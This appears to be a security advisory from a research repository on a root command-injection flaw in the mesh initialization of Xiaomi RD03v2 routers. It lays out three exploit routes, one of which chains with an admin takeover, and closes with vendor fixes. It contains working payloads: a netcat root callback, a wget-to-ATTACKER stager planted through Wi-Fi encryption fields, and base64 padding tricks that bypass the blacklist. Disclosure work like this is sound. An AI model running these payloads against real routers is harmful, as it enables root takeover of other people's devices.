# V2 — root command injection in mesh initialization

V2 is one vulnerability: attacker-controlled mesh initialization data reaches
`mimesh_init.sh`'s root shell `eval`. It is not one exploit sequence. This
repository demonstrates **two V2-only routes** and **one combined V1 → V2 route**.
V1 remains the separate admin-verifier disclosure documented in
[`v1-admin-takeover.md`](v1-admin-takeover.md).

## Exploit routes at a glance

| Exploit route | Relationship | Required target state | Attacker position | Input source | Validation |
|---|---|---|---|---|---|
| **Direct V2 RE/WAN** (`re_wan_rce.py`) | V2 only; no V1, admin session, or `init_router.py` | Factory state (`INITTED!=YES`); selected WAN has DHCP/gateway state; rogue CAP wins discovery | WAN-side L2 | Raw type-6 `bh_ssid` / `bh_pswd` | Hardware: direct `uid=0(root)` callback |
| **Combined V1 → V2 CAP/UCI** (`ota_rce.py`) | V1 supplies the admin session used for the UCI plant; V2 supplies root execution | Deliberately prepared CAP: `INITTED=YES`, `get_netmode=0`, UCI `NETMODE` unset | Main LAN / Wi-Fi | Wi-Fi `encryption` UCI values | Hardware: root callback and interactive shell |
| **Direct V2 CAP/LAN** (`rce_poc.py`) | V2 only; constrained research primitive | Reachable initialized CAP in the same tested gate-open state | Main LAN / Wi-Fi | Type-4 `body[0x90]` plant | Emulation: root-owned file; about four command characters |

**CVSS 3.1: 8.8 High — `AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`** for
the two hardware-confirmed adjacent attack sequences. Their prerequisites are
different and must not be merged.

The combined route uses two separate `cab_meshd` connections. V1 stops after
reading the CAP's type-6 sync and mints an admin `stok`; after the API plant, V2
opens a new connection and sends the tested trigger. V1 is a dependency of that
exploit construction, not a dependency of the V2 vulnerability or either direct
route.

## Vulnerability: unsafe root `eval`

All three routes converge on the same shell operation:

```text
mesh_connect.sh:6       source /lib/mimesh/mimesh_init.sh
do_cap_init/do_re_init  collect UCI or decoded wire values
                        build JSON for mimesh_init
mimesh_init.sh:717      eval "$key=\"`json_get_value ...`\""
```

The protocol entry points differ:

- CAP-side routes send type-7 and call the `cap_init` builder at `0xa3bc`, then
  `system()` at `0xa598`. The handler checks CAP/server role and `body[0] == 1`,
  but does not compare connection state or validate an HMAC.
- RE/WAN receives type-6 in `ST_RUNNING` and calls the `re_init` builder at
  `0xa950`, then `system()` at `0xae94`.

The later `do_cap_init` shell gate skips the sink for `NETMODE=whc_cap`, and for
`NETMODE=lanapmode` together with `CAP_MODE=ap`. `do_re_init` has no equivalent
`NETMODE` guard. The three route sections below describe how controlled data
reaches this common sink.

## V2-only exploit routes

### Direct V2 RE/WAN — type-6 exploit

This is the simplest confirmed root path for a factory-reset device. It requires
neither V1 nor `init_router.py`; the router initiates the connection.

#### Prerequisites

- Stock RD03v2 2.0.28 remains uninitialized (`INITTED!=YES`; API
  `init_info.inited=0`).
- The attacker shares the selected WAN port's L2 segment and can provide ordinary
  DHCP/gateway state.
- The rogue CAP answers discovery before any legitimate CAP.

The hardware test used attacker `192.168.77.1/24` and router lease
`192.168.77.142` on an isolated WAN segment.

#### Startup and reversed handshake

The shipped static config has an empty WAN name, but boot-time `port_service`
assigned `network.wan.ifname=eth1.4` before `START=99`. The router started:

```text
/usr/sbin/cab_meshd -C -i eth1.4
```

The live exchange was:

1. RE broadcasts `MIROUTE_RE_DDv1.0\0` to `255.255.255.255:19553`.
2. Rogue CAP replies with `MIROUTE_CAP_DDv1.0` and its IP at offset `0x12`.
3. RE opens TLS to the advertised address. The rogue CAP uses a self-signed
   certificate; the RE performs no certificate verification.
4. RE sends type-4 authentication using the `q38d…` key.
5. Rogue CAP sends type-5 success and type-4 authentication generated with
   `x38d364d8ed3bd085e150211ea6b3715`.
6. RE accepts the predicted `x` token, replies type-5 success, and enters
   `ST_RUNNING`.
7. Rogue CAP sends the type-6 `re_init` body.

Hardware negotiated `TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384`.

#### Type-6 layout and argument alignment

The accepted body is 1,764 bytes and follows the stock CAP sync layout. Builder
`0xa950` base64-encodes raw fields at:

- `body+0xe6` → seventh string position → `do_re_init` `$7` (`bh_ssid`)
- `body+0x107` → eighth string position → `do_re_init` `$8` (`bh_pswd`)

The stock CAP body leaves four earlier front-haul password/management fields empty.
Because `run_with_lock` invokes unquoted `$@`, ash drops those empty words and
shifts the controlled fields away from `$7/$8`. The working type-6 message fills
all four with benign nonempty values, preserving all nine string positions.

The encoder destinations allow 36 bytes for `bh_ssid` and 66 bytes for `bh_pswd`.
Their adjacent NUL-terminated wire slots provide straightforward non-overlapping
capacities of 32 and 64 bytes. Carefully designed overlap can recover some of the
remaining encoder headroom.

The RE builder base64-encodes these raw wire fields before `check_injection` sees
them. `do_re_init` later runs `base64 -d`, so validation occurs on the encoded
representation rather than on the bytes that reach the root `eval`.

#### Hardware proof

The 23-byte expression in `bh_pswd` was:

```text
`id|nc 192.168.77.1 80`
```

The isolated listener received:

```text
[ROOT PROOF] callback from 192.168.77.142: uid=0(root) gid=0(root)
[+] CONFIRMED: RE/WAN payload executed as uid 0 (root)
```

PoC: `poc/re_wan_rce.py`.

#### One-shot state transition

`do_re_init` has no `NETMODE` guard, and the defined `check_re_initted` helper is
unused. A successful run nevertheless continues through normal mesh initialization:
it sets `INITTED=YES`, changes the wired DHCP client from the WAN MAC to the LAN
MAC, and stops `cab_meshd`. The exposure is therefore one-shot after a successful
run and returns only after another factory reset. Failed or interrupted attempts can
reconnect while the router remains uninitialized.

### Direct V2 CAP/LAN — type-4 research primitive

This path reaches the CAP sink without V1 or an admin API plant, but its payload is
very small.

#### Prerequisites

- `cab_meshd -S -i br-lan` is reachable on an initialized CAP.
- The supported reproduction state is API `get_netmode=0` with UCI `NETMODE`
  unset. The shell skips the sink for `whc_cap`, and also for
  `NETMODE=lanapmode` together with `CAP_MODE=ap`.
- The attacker is on the main LAN or Wi-Fi.

The state produced by `init_router.py` satisfies these conditions in the lab, but
the direct payload was not executed on physical hardware. Its evidence level is
daemon-driven emulation.

#### Delivery

The type-4 handler copies 19 bytes from `body[0x90]` into `conn+0x10e`. A five-word
pad makes the following base64 token become `do_cap_init` `$6` after unquoted `$@`
re-splitting:

```text
type-4 body[0x90] = "a a a a a " + base64(`CMD`)
```

The PoC then completes its tested `4 → 5 → 7` exchange; type-7 invokes the
`cap_init` builder. The handler itself has no connection-state comparison, but
the published PoC retains the full validated sequence.

The attacker performs this base64 encoding; the CAP builder does not. Its
`check_injection` blacklist is:

```text
@`$#,;'\"[]&*()|<>
```

Space and the base64 alphabet are permitted, so the padded encoded plant passes.
Only after unquoted `$@` makes the token `$6` does `do_cap_init` decode the blocked
shell bytes.

The plant has only eight base64 bytes left after the pad: about six decoded bytes,
including the surrounding backticks, or roughly four command characters.

#### Emulation proof

With `NETMODE` unset, the stock daemon and scripts processed ``base64("`>W`")`` and
created root-owned `/W`. An `` `id` `` payload reached the same root sink. A
completed `cap_init` can then set `NETMODE=whc_cap`, making this path effectively
one-shot.

PoC: `poc/rce_poc.py`.

## Combined exploit: V1 → V2 through CAP/UCI

This is the full-payload, over-Wi-Fi path implemented by `poc/ota_rce.py` and
confirmed on physical RD03v2 hardware.

### Laboratory state used for validation

The hardware result used this exact preparation:

1. Factory-reset an RD03v2 running stock 2.0.28.
2. Run `poc/init_router.py --host 192.168.31.1 --reboot`.
3. Confirm the helper set `INITTED=YES`, left `NETMODE` unset, and rebooted the
   router so `/etc/init.d/cab_meshd` started `cab_meshd -S -i br-lan`.
4. Join the router's main Wi-Fi or LAN and confirm TCP/19553 is reachable.

`init_router.py` is **laboratory preparation**, not an exploit primitive and not an
attacker capability demonstrated against a normally configured router. A factory
unit has no inbound CAP listener, so this path cannot begin until the preparation
and reboot are complete. Xiaomi's normal web wizard can instead call
`mesh_connect.sh init_cap 2` and commit `NETMODE=whc_cap`; that state skips the
demonstrated CAP root sink. No non-reset transition from that normal configured
state to the gate-open state has been demonstrated.

### V1 obtains admin; V2 triggers the sink

The combined CAP/UCI exploit needs an admin API call to store a long payload in the
Wi-Fi `encryption` UCI values. V1 supplies that access:

1. V1 forges the mesh HMAC, reaches `ST_RUNNING`, receives `web_passwd256`, and
   mints an admin `stok`.
2. `set_wifi_without_restart` stores payloads in the 2.4 GHz and 5 GHz
   `encryption` fields while preserving the SSID.
3. A credential-free `4 → 5 → 7` mesh exchange triggers `cap_init`.
4. `do_cap_init` reads the poisoned UCI values and passes them into
   `mimesh_init.sh`'s root `eval`.

`do_cap_init` reads `mgmt_2g` and `mgmt_5g` directly from the stored UCI
`encryption` values. This input does not pass through the daemon's
`check_injection` blacklist.

If a tester already has a valid admin session, step 1 can be skipped; the payload
plant and V2 trigger remain the same. V1 is therefore a delivery dependency of
`ota_rce.py`, not a dependency of V2 itself.

### Payload construction

The two values pass the web layer's `hackCheck` because they contain none of its
blocked bytes (backtick, ``;|$&`` or newline):

```text
2.4 GHz: \" wget http://ATTACKER:8000/s -O /tmp/x #
5 GHz:   \" sh /tmp/x #
```

When `mimesh_init.sh` evaluates a parsed value, `\"` becomes `"`; the first value
becomes an assignment-prefixed `wget`, and `#` comments out the trailing syntax.
The second value executes the downloaded stager. No small field-specific limit was
found for this UCI plant; ordinary HTTP, nginx, UCI, shell, and process limits still
apply.

### Hardware proof

The stager returned:

```text
*** ROOT CALLBACK: /pwned?uid=0_user=root_host=XiaoQiang ***
```

The reconnecting shell then reported:

```text
uid=0(root) gid=0(root)
Linux XiaoQiang 4.4.60 #0 SMP PREEMPT ... armv7l GNU/Linux
RD03v2
```

The payload restored valid Wi-Fi encryption and reconnected the test station.
Detailed output is in `evidence/hardware-validation.md`.

## Evidence boundaries

- **Direct V2 RE/WAN:** physical hardware from `inited=0` through DHCP,
  discovery, reversed HMAC/TLS, type-6 delivery, and a `uid=0(root)` callback.
- **Combined V1 → V2 CAP/UCI:** physical hardware, root callback and interactive
  shell, after explicit `init_router.py` laboratory preparation.
- **Direct V2 CAP/LAN:** stock daemon and scripts in emulation; the direct payload was
  not executed on hardware.

The combined CAP/UCI result does not establish reachability after Xiaomi's normal
wizard sets `whc_cap`. The RE/WAN result applies only to the separate factory/WAN
state.

## Fix

1. Replace the firmware-global mesh key with per-device or enrollment credentials.
2. Require mutual TLS and verify the peer certificate.
3. Quote `"$@"` in `run_with_lock`.
4. Remove `eval` from parsed mesh data; assign validated values without reparsing
   them as shell code.
5. Treat decoded peer fields as opaque data instead of relying on a blacklist that
   sees only an allowed pad/base64 form on CAP or daemon-generated base64 on RE.

See `remediation.md` for the complete vendor recommendations.
